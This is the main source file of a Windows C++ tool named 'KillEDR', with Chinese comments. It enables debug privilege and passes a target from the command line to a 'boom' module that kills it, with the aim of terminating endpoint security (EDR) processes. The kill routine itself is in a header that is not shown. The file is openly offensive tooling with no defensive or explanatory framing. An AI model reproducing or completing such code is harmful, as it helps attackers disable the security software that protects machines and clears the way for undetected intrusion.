// KillEDR.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>

#include "utils.hpp"
#include "boom.hpp"

int main()
{
	int ret = EXIT_FAILURE;

	do
	{
		int argc = 0;
		LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
		if (argc != 2)
		{
			break;
		}

		// 提权
		if (!utils::EnableDebugPrivilege())
		{
			break;
		}

		//
		// BOOM!!!	
		// 
		if (boom::instance()->kill(argv[1]))
		{
			std::cout << "Kill Success!\n";
		}

		ret = EXIT_SUCCESS;
	} while (false);

	return ret;
}